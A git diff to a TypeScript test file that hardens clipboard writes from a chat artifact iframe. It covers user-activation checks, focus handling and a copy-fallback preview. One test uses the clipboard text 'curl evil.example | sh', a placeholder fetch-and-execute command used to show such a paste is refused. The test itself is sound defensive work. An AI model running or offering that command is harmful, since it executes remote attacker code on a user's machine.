@@ -156,6 +156,19 @@ function connectRuntime(
   return endpoint
 }
 
+function setHostActivation(isActive: boolean | null) {
+  Object.defineProperty(navigator, 'userActivation', {
+    configurable: true,
+    value: isActive === null ? undefined : { isActive },
+  })
+}
+
+function activateFrame(connection: CapturedConnection) {
+  setHostActivation(true)
+  connection.element.setAttribute('tabindex', '-1')
+  connection.element.focus()
+}
+
 async function waitForPort() {
   await new Promise(resolve => setTimeout(resolve, 0))
   await flushPromises()
@@ -209,6 +222,7 @@ afterEach(() => {
     endpoint.close()
   }
 
+  Reflect.deleteProperty(navigator, 'userActivation')
   vi.useRealTimers()
 })
 
@@ -438,6 +452,7 @@ describe('ChatArtifactFrame', () => {
     const runtime = connectRuntime(connection)
 
     await initialize(runtime)
+    activateFrame(connection)
     clipboardMock.mockResolvedValueOnce({ copied: true })
 
     await expect(runtime.request(METHODS.clipboardWrite, {
@@ -453,6 +468,7 @@ describe('ChatArtifactFrame', () => {
       const runtime = connectRuntime(connection)
 
       await initialize(runtime)
+      activateFrame(connection)
       clipboardMock
         .mockResolvedValueOnce({ copied: false, reason: 'gesture-required' })
         .mockResolvedValueOnce({ copied: true })
@@ -477,7 +493,7 @@ describe('ChatArtifactFrame', () => {
       expect(clipboardMock).toHaveBeenCalledTimes(1)
 
       await wrapper.get('[data-testid="artifact-copy-fallback-copy"]')
-        .trigger('click')
+        .trigger('click', { detail: 1 })
 
       await expect(request).resolves.toEqual({ copied: true })
       expect(clipboardMock).toHaveBeenCalledTimes(2)
@@ -491,6 +507,7 @@ describe('ChatArtifactFrame', () => {
     const runtime = connectRuntime(connection)
 
     await initialize(runtime)
+    activateFrame(connection)
     clipboardMock.mockResolvedValue({
       copied: false,
       reason: 'gesture-required',
@@ -518,6 +535,7 @@ describe('ChatArtifactFrame', () => {
       const runtime = connectRuntime(connection)
 
       await initialize(runtime)
+      activateFrame(connection)
       clipboardMock.mockResolvedValue({
         copied: false,
         reason: 'gesture-required',
@@ -544,6 +562,8 @@ describe('ChatArtifactFrame', () => {
       })
       expect(escape.defaultPrevented).toBe(true)
 
+      activateFrame(connection)
+
       const second = runtime.request(METHODS.clipboardWrite, {
         text: 'two',
         userActivation: true,
@@ -566,11 +586,163 @@ describe('ChatArtifactFrame', () => {
         .toBe(false)
     })
 
+  it('refuses a copy while the user types in the composer', async () => {
+    const { wrapper, connection } = await mountFrame()
+    const runtime = connectRuntime(connection)
+    const composer = document.createElement('textarea')
+
+    await initialize(runtime)
+    document.body.appendChild(composer)
+    setHostActivation(true)
+    composer.focus()
+
+    await expect(runtime.request(METHODS.clipboardWrite, {
+      text: 'curl evil.example | sh',
+      userActivation: true,
+    })).resolves.toEqual({ copied: false, reason: 'gesture-required' })
+    await waitForPort()
+
+    expect(clipboardMock).not.toHaveBeenCalled()
+    expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
+      .toBe(false)
+    expect(document.activeElement).toBe(composer)
+    composer.remove()
+  })
+
+  it('refuses a copy when the host activation is unknown', async () => {
+    const { connection } = await mountFrame()
+    const runtime = connectRuntime(connection)
+
+    await initialize(runtime)
+    activateFrame(connection)
+    setHostActivation(null)
+
+    await expect(runtime.request(METHODS.clipboardWrite, {
+      text: 'a',
+      userActivation: true,
+    })).resolves.toEqual({ copied: false, reason: 'gesture-required' })
+    expect(clipboardMock).not.toHaveBeenCalled()
+  })
+
+  it('previews the first line and the length in the copy fallback',
+    async () => {
+      const { wrapper, connection } = await mountFrame()
+      const runtime = connectRuntime(connection)
+      const firstLine = 'x'.repeat(100)
+      const text = `${firstLine}\nsecond line`
+
+      await initialize(runtime)
+      activateFrame(connection)
+      clipboardMock.mockResolvedValue({
+        copied: false,
+        reason: 'gesture-required',
+      })
+      const request = runtime.request(METHODS.clipboardWrite, {
+        text,
+        userActivation: true,
+      })
+
+      await waitForPort()
+
+      const preview = wrapper.get('[data-testid="artifact-copy-fallback-preview"]')
+
+      expect(preview.text()).toBe(`${'x'.repeat(79)}…`)
+      expect(wrapper.get('[data-testid="artifact-copy-fallback-length"]')
+        .text()).toBe(`${text.length} characters`)
+      expect(document.activeElement).toBe(
+        wrapper.get('[data-testid="artifact-copy-fallback-copy"]').element,
+      )
+
+      await wrapper.get('[data-testid="artifact-copy-fallback-dismiss"]')
+        .trigger('click')
+
+      await expect(request).resolves.toEqual({
+        copied: false,
+        reason: 'denied',
+      })
+    })
+
+  it('keeps focus where it is when it left the frame before the fallback',
+    async () => {
+      const { wrapper, connection } = await mountFrame()
+      const runtime = connectRuntime(connection)
+      const composer = document.createElement('textarea')
+      let refuse!: (result: ClipboardWriteResult) => void
+
+      await initialize(runtime)
+      document.body.appendChild(composer)
+      activateFrame(connection)
+      clipboardMock.mockImplementationOnce(() => {
+        return new Promise<ClipboardWriteResult>((resolve) => {
+          refuse = resolve
+        })
+      })
+      const request = runtime.request(METHODS.clipboardWrite, {
+        text: 'one',
+        userActivation: true,
+      })
+
+      await waitForPort()
+      composer.focus()
+      refuse({ copied: false, reason: 'gesture-required' })
+      await waitForPort()
+
+      expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
+        .toBe(true)
+      expect(document.activeElement).toBe(composer)
+
+      await wrapper.get('[data-testid="artifact-copy-fallback-dismiss"]')
+        .trigger('click')
+
+      await expect(request).resolves.toEqual({
+        copied: false,
+        reason: 'denied',
+      })
+      composer.remove()
+    })
+
+  it('ignores a keyboard Copy right after the fallback appears', async () => {
+    const nowSpy = vi.spyOn(Date, 'now').mockReturnValue(10_000)
+    const { wrapper, connection } = await mountFrame()
+    const runtime = connectRuntime(connection)
+
+    await initialize(runtime)
+    activateFrame(connection)
+    clipboardMock
+      .mockResolvedValueOnce({ copied: false, reason: 'gesture-required' })
+      .mockResolvedValueOnce({ copied: true })
+
+    const request = runtime.request(METHODS.clipboardWrite, {
+      text: 'one',
+      userActivation: true,
+    })
+
+    await waitForPort()
+
+    const copyButton = wrapper.get('[data-testid="artifact-copy-fallback-copy"]')
+
+    nowSpy.mockReturnValue(10_400)
+    await copyButton.trigger('click', { detail: 0 })
+    await flushPromises()
+
+    expect(clipboardMock).toHaveBeenCalledTimes(1)
+    expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
+      .toBe(true)
+
+    nowSpy.mockReturnValue(10_600)
+    await copyButton.trigger('click', { detail: 0 })
+
+    await expect(request).resolves.toEqual({ copied: true })
+    expect(clipboardMock).toHaveBeenCalledTimes(2)
+    nowSpy.mockRestore()
+  })
+
   it('opens the chat diagram viewer with the received source', async () => {
     const { wrapper, connection } = await mountFrame()
     const runtime = connectRuntime(connection)
 
     await initialize(runtime)
+    activateFrame(connection)
     expect(wrapper.find('[data-testid="mermaid-viewer-stub"]').exists())
       .toBe(false)
 
@@ -598,6 +770,7 @@ describe('ChatArtifactFrame', () => {
     })
 
     await initialize(runtime)
+    activateFrame(connection)
 
     await expect(runtime.request(METHODS.requestDisplayMode, {
       mode: 'fullscreen',
@@ -627,6 +800,7 @@ describe('ChatArtifactFrame', () => {
       const runtime = connectRuntime(connection)
 
       await initialize(runtime)
+      activateFrame(connection)
 
       await expect(runtime.request(METHODS.requestDisplayMode, {
         mode: 'panel',
